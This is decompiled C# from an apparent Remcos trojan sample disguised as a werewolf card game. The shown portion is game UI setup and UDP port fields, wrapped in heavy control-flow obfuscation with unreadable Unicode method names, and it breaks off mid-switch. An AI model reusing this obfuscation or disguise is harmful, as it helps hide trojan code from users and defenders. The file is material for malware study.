// Decompiled with JetBrains decompiler
// Type: Vändtia_Live_Server.MainForm
// Assembly: yDseEhTG5bnen4G, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4C5C9DF7-D67E-851A-F932-4F9F562A97E6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.MSIL.Remcos.gen-a9fcf50b626f7a735761798ddff08a65e037fbde2ef6e57f066150543ebcb249.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Media;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Vändtia_Live_Server.My;

namespace Vändtia_Live_Server
{
  [DesignerGenerated]
  public class MainForm : Form
  {
    private IContainer components;
    private Player thisPlayer;
    private List<Player> PlayerList;
    private List<string> isMasterList;
    private List<string> CharacterList;
    private List<string> isReadyList;
    private List<string> MiddleCardsList;
    private List<PictureBox> MiddleCardPicutreList;
    private Dictionary<string, int> RolePlayTime;
    private List<Label> ListOfPlayerNameLabels;
    private List<PictureBox> ListOfPlayerCards;
    private string recievedID;
    private bool PlayerExists;
    private bool RoundStarted;
    private bool EnableAudio;
    private bool isMaster;
    private int Pos;
    private bool StartRound;
    private string RoundTime;
    private int voteCount;
    private object EndRoundVotePassed;
    private int TurnTime;
    private string InitialRole;
    private bool AlreadyVoted;
    private int TimeMulti;
    private bool WWFound;
    private bool MFound;
    private bool SFound;
    private bool RFound;
    private bool TMFound;
    private bool DFound;
    private bool IFound;
    private int randomIntegerID;
    private int Time;
    private object Night;
    private object ReverseTimer;
    private int GamePlayerCount;
    private bool SawCard;
    private bool OneWereWolf;
    private int CardCount;
    private bool TurnAllowed;
    private object TMFirstPickIndex;
    private string RobbersNewRole;
    private string DrunksNewRole;
    private VoteMenuForm VMF;
    private const int port = 9653;
    private const string broadcastAddress = "255.255.255.255";
    private UdpClient receivingClient;
    private UdpClient sendingClient;
    private const int portChat = 9654;
    private UdpClient receivingClientChat;
    private UdpClient sendingClientChat;
    private const int portPlayerInfo = 9655;
    private UdpClient receivingClientPlayerInfo;
    private UdpClient sendingClientPlayerInfo;
    private const int portIsReady = 9656;
    private UdpClient receivingClientIsReady;
    private UdpClient sendingClientIsReady;
    private const int portAssignedCards = 9657;
    private UdpClient receivingAssignedCards;
    private UdpClient sendingAssignedCards;
    private const int portUpdateCardChanges = 9658;
    private UdpClient receivingUpdateCardChanges;
    private UdpClient sendingUpdateCardChanges;
    private const int portRevealCards = 9659;
    private UdpClient receivingRevealCards;
    private UdpClient sendingRevealCards;

    public MainForm()
    {
label_2:
      int num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(9);
label_1:
      while (true)
      {
        num1 ^= 38;
        switch (num1 + 36)
        {
          case 0:
            goto label_3;
          case 1:
            this.CardCount = 0;
            this.TurnAllowed = false;
            this.TMFirstPickIndex = (object) -1;
            num1 = -49;
            continue;
          case 2:
            this.SFound = false;
            this.RFound = false;
            this.TMFound = false;
            num1 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(37);
            continue;
          case 3:
            this.MiddleCardsList = new List<string>();
            this.MiddleCardPicutreList = new List<PictureBox>();
            this.RolePlayTime = new Dictionary<string, int>();
            num1 = -58;
            continue;
          case 4:
            this.ListOfPlayerNameLabels = new List<Label>();
            this.ListOfPlayerCards = new List<PictureBox>();
            this.recievedID = "";
            num1 = -51;
            continue;
          case 5:
            this.isMasterList = new List<string>();
            this.CharacterList = new List<string>();
            this.isReadyList = new List<string>();
            num1 = -7;
            continue;
          case 6:
            this.TurnTime = 10;
            this.InitialRole = "";
            this.AlreadyVoted = false;
            num1 = -64;
            continue;
          case 7:
            this.DFound = false;
            this.IFound = false;
            this.randomIntegerID = 0;
            num1 = -63;
            continue;
          case 8:
            this.thisPlayer = new Player(0, "Nothing", "FreshBait");
            this.PlayerList = new List<Player>();
            num1 = -57;
            continue;
          case 9:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF485);
            num1 = -61;
            continue;
          case 10:
            this.TimeMulti = 0;
            this.WWFound = false;
            this.MFound = false;
            num1 = -8;
            continue;
          case 11:
            this.Time = 0;
            this.Night = (object) false;
            this.ReverseTimer = (object) false;
            num1 = -52;
            continue;
          case 12:
            this.RoundTime = "2";
            this.voteCount = 0;
            this.EndRoundVotePassed = (object) false;
            num1 = -60;
            continue;
          case 13:
            this.RobbersNewRole = "Robber";
            this.DrunksNewRole = "Drunk";
            this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF465();
            num1 = -53;
            continue;
          case 14:
            this.GamePlayerCount = 0;
            this.SawCard = false;
            this.OneWereWolf = false;
            num1 = -5;
            continue;
          case 15:
            this.PlayerExists = false;
            this.RoundStarted = false;
            this.EnableAudio = true;
            num1 = -54;
            continue;
          case 16:
            this.isMaster = false;
            this.Pos = 0;
            this.StartRound = true;
            num1 = -50;
            continue;
          case 17:
            goto label_10;
          default:
            goto label_2;
        }
      }
label_10:
      return;
label_3:
      this.Load += new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF466);
label_5:
      int num2 = 0;
      while (true)
      {
        switch (num2 ^ 41)
        {
          case 41:
            num2 = 3;
            continue;
          case 42:
            this.FormClosing += new FormClosingEventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49D);
            num2 = 2;
            continue;
          case 43:
            num1 = -62;
            num2 = 4;
            continue;
          case 44:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF475);
            num2 = 5;
            continue;
          case 45:
            goto label_1;
          default:
            goto label_5;
        }
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (((!disposing ? 1 : 0) != 0 || this.components == null ? 1 : 0) != 0)
          return;
label_7:
        int num1 = 6;
        int num2 = -9;
        while (true)
        {
          switch ((num2 ^ 42) + 38)
          {
            case 0:
              switch (num1)
              {
                case 35:
                  num1 = 4;
                  goto label_2;
                case 36:
                  this.components.Dispose();
                  num1 = 1;
                  goto label_2;
                case 37:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.get_Card12);
                  num1 = 7;
                  goto label_2;
                case 38:
                  goto label_12;
                default:
                  num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(27);
                  continue;
              }
            case 1:
              goto label_7;
            case 2:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.set_PlayerName9);
              num2 = -10;
              continue;
            case 3:
label_2:
              num1 ^= 34;
              break;
          }
          num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(31);
        }
label_12:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF465()
    {
label_2:
      int num1 = 27;
label_1:
      ComponentResourceManager componentResourceManager;
      while (true)
      {
        num1 ^= 35;
        switch (num1)
        {
          case 35:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MainForm.get_PlayerName3);
            num1 = 0;
            continue;
          case 36:
            this.PlayerName7.AutoSize = true;
            this.PlayerName7.BorderStyle = BorderStyle.Fixed3D;
            this.PlayerName7.Font = new Font("Papyrus", 14.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.PlayerName7.ImageAlign = ContentAlignment.TopLeft;
            this.PlayerName7.Location = new Point(1711, 414);
            this.PlayerName7.Name = "PlayerName7";
            this.PlayerName7.Size = new Size(163, 32);
            this.PlayerName7.TabIndex = 32;
            this.PlayerName7.Text = "Not Connected";
            this.PlayerName7.Visible = false;
            this.Card10.Anchor = AnchorStyles.Right;
            this.Card10.Image = (Image) componentResourceManager.GetObject("Card10.Image");
            this.Card10.InitialImage = (Image) componentResourceManager.GetObject("Card10.InitialImage");
            this.Card10.Location = new Point(1575, 414);
            this.Card10.Name = "Card10";
            this.Card10.Size = new Size(130, 180);
            this.Card10.SizeMode = PictureBoxSizeMode.StretchImage;
            num1 = 19;
            continue;
          case 37:
            this.Settings.UseVisualStyleBackColor = true;
            this.ChatBox.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
            this.ChatBox.Font = new Font("Arial Rounded MT Bold", 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            this.ChatBox.Location = new Point(23, 718);
            this.ChatBox.Name = "ChatBox";
            this.ChatBox.Size = new Size(392, 124);
            this.ChatBox.TabIndex = 13;
            this.ChatBox.Text = "";
            this.GameTime.Interval = 1000;
            this.TimerLabel.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
            this.TimerLabel.AutoSize = true;
            this.TimerLabel.BackColor = SystemColors.Menu;
            this.TimerLabel.BorderStyle = BorderStyle.FixedSingle;
            this.TimerLabel.Font = new Font("Elephant", 18f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            this.TimerLabel.Location = new Point(23, 668);
            this.TimerLabel.Name = "TimerLabel";
            this.TimerLabel.Size = new Size(91, 33);
            num1 = 23;
            continue;
          case 38:
            this.TurnLabel.Font = new Font("Viner Hand ITC", 18f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.TurnLabel.ForeColor = Color.DarkOrange;
            this.TurnLabel.Location = new Point(641, 577);
            this.TurnLabel.Name = "TurnLabel";
            this.TurnLabel.Size = new Size(574, 132);
            this.TurnLabel.TabIndex = 24;
            this.TurnLabel.Text = "Turn Display";
            this.TurnLabel.TextAlign = ContentAlignment.MiddleCenter;
            this.TurnLabel.Visible = false;
            this.VoteMenuButton.Anchor = AnchorStyles.Bottom;
            this.VoteMenuButton.Enabled = false;
            this.VoteMenuButton.Font = new Font("Palatino Linotype", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.VoteMenuButton.Location = new Point(1014, 793);
            this.VoteMenuButton.Name = "VoteMenuButton";
            this.VoteMenuButton.Size = new Size(140, 35);
            this.VoteMenuButton.TabIndex = 25;
            this.VoteMenuButton.Text = "Vote Menu";
            num1 = 11;
            continue;
          case 39:
            this.Card6 = new PictureBox();
            this.Card5 = new PictureBox();
            this.BindingSource1 = new BindingSource(this.components);
            this.About = new Button();
            this.Instructions = new Button();
            this.TurnLabel = new Label();
            this.VoteMenuButton = new Button();
            this.RestartRoundButton = new Button();
            this.PlayerName5 = new Label();
            this.Card8 = new PictureBox();
            this.PlayerName6 = new Label();
            this.Card9 = new PictureBox();
            this.PlayerName7 = new Label();
            this.Card10 = new PictureBox();
            this.PlayerName9 = new Label();
            this.Card12 = new PictureBox();
            this.PlayerName8 = new Label();
            num1 = 13;
            continue;
          case 40:
            this.VoteMenuButton.UseVisualStyleBackColor = true;
            this.RestartRoundButton.Anchor = AnchorStyles.Bottom;
            this.RestartRoundButton.Enabled = false;
            this.RestartRoundButton.Font = new Font("Palatino Linotype", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.RestartRoundButton.Location = new Point(1016, 845);
            this.RestartRoundButton.Name = "RestartRoundButton";
            this.RestartRoundButton.Size = new Size(140, 35);
            this.RestartRoundButton.TabIndex = 26;
            this.RestartRoundButton.Text = "Restart Round";
            this.RestartRoundButton.UseVisualStyleBackColor = true;
            this.PlayerName5.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            this.PlayerName5.AutoSize = true;
            this.PlayerName5.BorderStyle = BorderStyle.Fixed3D;
            this.PlayerName5.Font = new Font("Papyrus", 14.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.PlayerName5.ImageAlign = ContentAlignment.TopLeft;
            this.PlayerName5.Location = new Point(1551, 38);
            this.PlayerName5.Name = "PlayerName5";
            num1 = 20;
            continue;
          case 41:
            this.Card11.Anchor = AnchorStyles.Right;
            this.Card11.Image = (Image) componentResourceManager.GetObject("Card11.Image");
            this.Card11.InitialImage = (Image) componentResourceManager.GetObject("Card11.InitialImage");
            this.Card11.Location = new Point(1575, 648);
            this.Card11.Name = "Card11";
            this.Card11.Size = new Size(130, 180);
            this.Card11.SizeMode = PictureBoxSizeMode.StretchImage;
            this.Card11.TabIndex = 35;
            this.Card11.TabStop = false;
            this.Card11.Visible = false;
            this.CardInfoButton.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            this.CardInfoButton.Location = new Point(1799, 847);
            this.CardInfoButton.Name = "CardInfoButton";
            this.CardInfoButton.Size = new Size(75, 23);
            this.CardInfoButton.TabIndex = 37;
            this.CardInfoButton.Text = "Card Info";
            this.CardInfoButton.UseVisualStyleBackColor = true;
            num1 = 9;
            continue;
          case 42:
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.BackgroundImageLayout = ImageLayout.Stretch;
            this.ClientSize = new Size(1910, 969);
            this.Controls.Add((Control) this.CardInfoButton);
            this.Controls.Add((Control) this.PlayerName8);
            this.Controls.Add((Control) this.Card11);
            this.Controls.Add((Control) this.PlayerName9);
            this.Controls.Add((Control) this.Card12);
            this.Controls.Add((Control) this.PlayerName7);
            this.Controls.Add((Control) this.Card10);
            this.Controls.Add((Control) this.PlayerName6);
            this.Controls.Add((Control) this.Card9);
            this.Controls.Add((Control) this.PlayerName5);
            this.Controls.Add((Control) this.Card8);
            this.Controls.Add((Control) this.RestartRoundButton);
            this.Controls.Add((Control) this.VoteMenuButton);
            num1 = 26;
            continue;
          case 43:
            this.Card5.TabStop = false;
            this.About.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            this.About.Location = new Point(1799, 934);
            this.About.Name = "About";
            this.About.Size = new Size(75, 23);
            this.About.TabIndex = 22;
            this.About.Text = "About";
            this.About.UseVisualStyleBackColor = true;
            this.Instructions.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            this.Instructions.Location = new Point(1799, 905);
            this.Instructions.Name = "Instructions";
            this.Instructions.Size = new Size(75, 23);
            this.Instructions.TabIndex = 23;
            this.Instructions.Text = "Instructions";
            this.Instructions.UseVisualStyleBackColor = true;
            this.TurnLabel.Anchor = AnchorStyles.Bottom;
            this.TurnLabel.BackColor = Color.Transparent;
            num1 = 5;
            continue;
          case 44:
            this.PlayerName1.AutoSize = true;
            this.PlayerName1.BorderStyle = BorderStyle.Fixed3D;
            this.PlayerName1.Font = new Font("Papyrus", 18f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.PlayerName1.Location = new Point(1014, 737);
            this.PlayerName1.Name = "PlayerName1";
            this.PlayerName1.Size = new Size(201, 40);
            this.PlayerName1.TabIndex = 19;
            this.PlayerName1.Text = "Not Connected";
            this.PlayerName4.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            this.PlayerName4.AutoSize = true;
            this.PlayerName4.BorderStyle = BorderStyle.Fixed3D;
            this.PlayerName4.Font = new Font("Papyrus", 14.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.PlayerName4.ImageAlign = ContentAlignment.TopLeft;
            this.PlayerName4.Location = new Point(1221, 38);
            this.PlayerName4.Name = "PlayerName4";
            this.PlayerName4.Size = new Size(163, 32);
            this.PlayerName4.TabIndex = 20;
            num1 = 17;
            continue;
          case 45:
            this.PlayerName2.AutoSize = true;
            this.PlayerName2.BorderStyle = BorderStyle.Fixed3D;
            this.PlayerName2.Font = new Font("Papyrus", 14.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.PlayerName2.Location = new Point(226, 38);
            this.PlayerName2.Name = "PlayerName2";
            this.PlayerName2.Size = new Size(163, 32);
            this.PlayerName2.TabIndex = 17;
            this.PlayerName2.Text = "Not Connected";
            this.PlayerName3.AutoSize = true;
            this.PlayerName3.BorderStyle = BorderStyle.Fixed3D;
            this.PlayerName3.Font = new Font("Papyrus", 14.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.PlayerName3.Location = new Point(564, 38);
            this.PlayerName3.Name = "PlayerName3";
            this.PlayerName3.Size = new Size(163, 32);
            this.PlayerName3.TabIndex = 18;
            this.PlayerName3.Text = "Not Connected";
            this.PlayerName1.Anchor = AnchorStyles.Bottom;
            num1 = 15;
            continue;
          case 46:
            this.Card11 = new PictureBox();
            this.CardInfoButton = new Button();
            ((ISupportInitialize) this.Card4).BeginInit();
            ((ISupportInitialize) this.Card3).BeginInit();
            ((ISupportInitialize) this.Card1).BeginInit();
            ((ISupportInitialize) this.Card2).BeginInit();
            ((ISupportInitialize) this.Card7).BeginInit();
            ((ISupportInitialize) this.Card6).BeginInit();
            ((ISupportInitialize) this.Card5).BeginInit();
            ((ISupportInitialize) this.BindingSource1).BeginInit();
            ((ISupportInitialize) this.Card8).BeginInit();
            ((ISupportInitialize) this.Card9).BeginInit();
            ((ISupportInitialize) this.Card10).BeginInit();
            ((ISupportInitialize) this.Card12).BeginInit();
            ((ISupportInitialize) this.Card11).BeginInit();
            this.SuspendLayout();
            this.SendButton.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
            num1 = 12;
            continue;
          case 47:
            this.SendButton.Location = new Point(23, 858);
            this.SendButton.Name = "SendButton";
            this.SendButton.Size = new Size(75, 23);
            this.SendButton.TabIndex = 8;
            this.SendButton.Text = "Send";
            this.SendButton.UseVisualStyleBackColor = true;
            this.MessageInput.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
            this.MessageInput.Location = new Point(118, 861);
            this.MessageInput.Name = "MessageInput";
            this.MessageInput.Size = new Size(297, 20);
            this.MessageInput.TabIndex = 10;
            this.Settings.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            this.Settings.Location = new Point(1799, 876);
            this.Settings.Name = "Settings";
            this.Settings.Size = new Size(75, 23);
            this.Settings.TabIndex = 12;
            this.Settings.Text = "Settings";
            num1 = 6;
            continue;
          case 48:
            this.Card10.TabIndex = 31;
            this.Card10.TabStop = false;
            this.Card10.Visible = false;
            this.PlayerName9.AutoSize = true;
            this.PlayerName9.BorderStyle = BorderStyle.Fixed3D;
            this.PlayerName9.Font = new Font("Papyrus", 14.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.PlayerName9.ImageAlign = ContentAlignment.TopLeft;
            this.PlayerName9.Location = new Point(226, 357);
            this.PlayerName9.Name = "PlayerName9";
            this.PlayerName9.Size = new Size(163, 32);
            this.PlayerName9.TabIndex = 34;
            this.PlayerName9.Text = "Not Connected";
            this.PlayerName9.Visible = false;
            this.Card12.Anchor = AnchorStyles.Left;
            this.Card12.Image = (Image) componentResourceManager.GetObject("Card12.Image");
            this.Card12.InitialImage = (Image) componentResourceManager.GetObject("Card12.InitialImage");
            this.Card12.Location = new Point(90, 357);
            num1 = 21;
            continue;
          case 49:
            this.Card3.Name = "Card3";
            this.Card3.Size = new Size(130, 180);
            this.Card3.SizeMode = PictureBoxSizeMode.StretchImage;
            this.Card3.TabIndex = 6;
            this.Card3.TabStop = false;
            this.Card1.Anchor = AnchorStyles.Bottom;
            this.Card1.InitialImage = (Image) componentResourceManager.GetObject("Card1.InitialImage");
            this.Card1.Location = new Point(845, 737);
            this.Card1.Name = "Card1";
            this.Card1.Size = new Size(150, 205);
            this.Card1.SizeMode = PictureBoxSizeMode.StretchImage;
            this.Card1.TabIndex = 5;
            this.Card1.TabStop = false;
            this.Card2.BackgroundImage = (Image) componentResourceManager.GetObject("Card2.BackgroundImage");
            this.Card2.Image = (Image) componentResourceManager.GetObject("Card2.Image");
            this.Card2.InitialImage = (Image) componentResourceManager.GetObject("Card2.InitialImage");
            this.Card2.Location = new Point(90, 38);
            num1 = 25;
            continue;
          case 50:
            goto label_18;
          case 51:
            this.PlayerName6.Location = new Point(1711, 192);
            this.PlayerName6.Name = "PlayerName6";
            this.PlayerName6.Size = new Size(163, 32);
            this.PlayerName6.TabIndex = 30;
            this.PlayerName6.Text = "Not Connected";
            this.PlayerName6.Visible = false;
            this.Card9.Anchor = AnchorStyles.Right;
            this.Card9.Image = (Image) componentResourceManager.GetObject("Card9.Image");
            this.Card9.InitialImage = (Image) componentResourceManager.GetObject("Card9.InitialImage");
            this.Card9.Location = new Point(1575, 192);
            this.Card9.Name = "Card9";
            this.Card9.Size = new Size(130, 180);
            this.Card9.SizeMode = PictureBoxSizeMode.StretchImage;
            this.Card9.TabIndex = 29;
            this.Card9.TabStop = false;
            this.Card9.Visible = false;
            this.PlayerName7.Anchor = AnchorStyles.Right;
            num1 = 7;
            continue;
          case 52:
            this.TimerLabel.TabIndex = 14;
            this.TimerLabel.Text = "Timer";
            this.ReadyToStart.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
            this.ReadyToStart.AutoSize = true;
            this.ReadyToStart.BackColor = Color.Silver;
            this.ReadyToStart.CheckAlign = ContentAlignment.MiddleRight;
            this.ReadyToStart.Enabled = false;
            this.ReadyToStart.FlatStyle = FlatStyle.Popup;
            this.ReadyToStart.Font = new Font("Modern No. 20", 18f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.ReadyToStart.ForeColor = SystemColors.HotTrack;
            this.ReadyToStart.Location = new Point(129, 672);
            this.ReadyToStart.Name = "ReadyToStart";
            this.ReadyToStart.Size = new Size(342, 29);
            this.ReadyToStart.TabIndex = 16;
            this.ReadyToStart.Text = "Not Enough Players To Start";
            this.ReadyToStart.TextAlign = ContentAlignment.MiddleCenter;
            this.ReadyToStart.UseVisualStyleBackColor = false;
            num1 = 14;
            continue;
          case 53:
            this.Controls.Add((Control) this.Card7);
            this.Controls.Add((Control) this.Card6);
            this.Controls.Add((Control) this.Card5);
            this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
            this.MinimumSize = new Size(300, 300);
            this.Name = nameof (MainForm);
            this.Text = "One Night Ultimate WereWolf PC Edition 1.2.8.2 Beta";
            ((ISupportInitialize) this.Card4).EndInit();
            ((ISupportInitialize) this.Card3).EndInit();
            ((ISupportInitialize) this.Card1).EndInit();
            ((ISupportInitialize) this.Card2).EndInit();
            ((ISupportInitialize) this.Card7).EndInit();
            ((ISupportInitialize) this.Card6).EndInit();
            ((ISupportInitialize) this.Card5).EndInit();
            ((ISupportInitialize) this.BindingSource1).EndInit();
            ((ISupportInitialize) this.Card8).EndInit();
            ((ISupportInitialize) this.Card9).EndInit();
            num1 = 31;
            continue;
          case 54:
            this.Card12.Name = "Card12";
            this.Card12.Size = new Size(130, 180);
            this.Card12.SizeMode = PictureBoxSizeMode.StretchImage;
            this.Card12.TabIndex = 33;
            this.Card12.TabStop = false;
            this.Card12.Visible = false;
            this.PlayerName8.Anchor = AnchorStyles.Right;
            this.PlayerName8.AutoSize = true;
            this.PlayerName8.BorderStyle = BorderStyle.Fixed3D;
            this.PlayerName8.Font = new Font("Papyrus", 14.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.PlayerName8.ImageAlign = ContentAlignment.TopLeft;
            this.PlayerName8.Location = new Point(1711, 648);
            this.PlayerName8.Name = "PlayerName8";
            this.PlayerName8.Size = new Size(163, 32);
            this.PlayerName8.TabIndex = 36;
            this.PlayerName8.Text = "Not Connected";
            this.PlayerName8.Visible = false;
            num1 = 10;
            continue;
          case 55:
            this.PlayerName5.Size = new Size(163, 32);
            this.PlayerName5.TabIndex = 28;
            this.PlayerName5.Text = "Not Connected";
            this.PlayerName5.Visible = false;
            this.Card8.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            this.Card8.Location = new Point(1415, 38);
            this.Card8.Name = "Card8";
            this.Card8.Size = new Size(130, 180);
            this.Card8.SizeMode = PictureBoxSizeMode.StretchImage;
            this.Card8.TabIndex = 27;
            this.Card8.TabStop = false;
            this.Card8.Visible = false;
            this.PlayerName6.Anchor = AnchorStyles.Right;
            this.PlayerName6.AutoSize = true;
            this.PlayerName6.BorderStyle = BorderStyle.Fixed3D;
            this.PlayerName6.Font = new Font("Papyrus", 14.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.PlayerName6.ImageAlign = ContentAlignment.TopLeft;
            num1 = 16;
            continue;
          case 56:
            this.components = (IContainer) new System.ComponentModel.Container();
            componentResourceManager = new ComponentResourceManager(typeof (MainForm));
            this.SendButton = new Button();
            this.MessageInput = new TextBox();
            this.Settings = new Button();
            this.ChatBox = new RichTextBox();
            this.GameTime = new System.Windows.Forms.Timer(this.components);
            this.TimerLabel = new Label();
            this.ReadyToStart = new CheckBox();
            this.PlayerName2 = new Label();
            this.PlayerName3 = new Label();
            this.PlayerName1 = new Label();
            this.PlayerName4 = new Label();
            this.Card4 = new PictureBox();
            this.Card3 = new PictureBox();
            this.Card1 = new PictureBox();
            this.Card2 = new PictureBox();
            this.Card7 = new PictureBox();
            num1 = 4;
            continue;
          case 57:
            this.Controls.Add((Control) this.TurnLabel);
            this.Controls.Add((Control) this.Instructions);
            this.Controls.Add((Control) this.About);
            this.Controls.Add((Control) this.PlayerName4);
            this.Controls.Add((Control) this.PlayerName1);
            this.Controls.Add((Control) this.PlayerName3);
            this.Controls.Add((Control) this.PlayerName2);
            this.Controls.Add((Control) this.ReadyToStart);
            this.Controls.Add((Control) this.TimerLabel);
            this.Controls.Add((Control) this.ChatBox);
            this.Controls.Add((Control) this.Settings);
            this.Controls.Add((Control) this.MessageInput);
            this.Controls.Add((Control) this.SendButton);
            this.Controls.Add((Control) this.Card4);
            this.Controls.Add((Control) this.Card3);
            this.Controls.Add((Control) this.Card1);
            this.Controls.Add((Control) this.Card2);
            num1 = 22;
            continue;
          case 58:
            this.Card2.Name = "Card2";
            this.Card2.Size = new Size(130, 180);
            this.Card2.SizeMode = PictureBoxSizeMode.StretchImage;
            this.Card2.TabIndex = 4;
            this.Card2.TabStop = false;
            this.Card7.Anchor = AnchorStyles.None;
            this.Card7.BackgroundImage = (Image) componentResourceManager.GetObject("Card7.BackgroundImage");
            this.Card7.Image = (Image) componentResourceManager.GetObject("Card7.Image");
            this.Card7.InitialImage = (Image) componentResourceManager.GetObject("Card7.InitialImage");
            this.Card7.Location = new Point(1062, 317);
            this.Card7.Name = "Card7";
            this.Card7.Size = new Size(130, 180);
            this.Card7.SizeMode = PictureBoxSizeMode.StretchImage;
            this.Card7.TabIndex = 2;
            this.Card7.TabStop = false;
            this.Card6.Anchor = AnchorStyles.None;
            this.Card6.BackgroundImage = (Image) componentResourceManager.GetObject("Card6.BackgroundImage");
            num1 = 24;
            continue;
          case 59:
            this.Card6.Image = (Image) componentResourceManager.GetObject("Card6.Image");
            this.Card6.InitialImage = (Image) componentResourceManager.GetObject("Card6.InitialImage");
            this.Card6.Location = new Point(845, 317);
            this.Card6.Name = "Card6";
            this.Card6.Size = new Size(130, 180);
            this.Card6.SizeMode = PictureBoxSizeMode.StretchImage;
            this.Card6.TabIndex = 1;
            this.Card6.TabStop = false;
            this.Card5.Anchor = AnchorStyles.None;
            this.Card5.BackgroundImage = (Image) componentResourceManager.GetObject("Card5.BackgroundImage");
            this.Card5.Image = (Image) componentResourceManager.GetObject("Card5.Image");
            this.Card5.InitialImage = (Image) componentResourceManager.GetObject("Card5.InitialImage");
            this.Card5.Location = new Point(638, 317);
            this.Card5.Name = "Card5";
            this.Card5.Size = new Size(130, 180);
            this.Card5.SizeMode = PictureBoxSizeMode.StretchImage;
            this.Card5.TabIndex = 0;
            num1 = 8;
            continue;
          case 60:
            goto label_48;
          default:
            goto label_2;
        }
      }
label_18:
      this.PlayerName4.Text = "Not Connected";
label_20:
      int num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(9);
      while (true)
      {
        switch ((num2 ^ 46) + 50)
        {
          case 0:
            this.Card4.TabIndex = 7;
            num2 = -3;
            continue;
          case 1:
            this.Card4.Visible = false;
            num2 = -11;
            continue;
          case 2:
            this.Card4.Name = "Card4";
            num2 = -14;
            continue;
          case 3:
            this.Card3.InitialImage = (Image) componentResourceManager.GetObject("Card3.InitialImage");
            num2 = -4;
            continue;
          case 4:
            this.Card3.Location = new Point(428, 38);
            num2 = -13;
            continue;
          case 5:
            this.Card4.TabStop = false;
            num2 = -31;
            continue;
          case 6:
            this.PlayerName4.Visible = false;
            num2 = -7;
            continue;
          case 7:
            this.Card4.Location = new Point(1085, 38);
            num2 = -2;
            continue;
          case 8:
            this.Card3.Image = (Image) componentResourceManager.GetObject("Card3.Image");
            num2 = -1;
            continue;
          case 9:
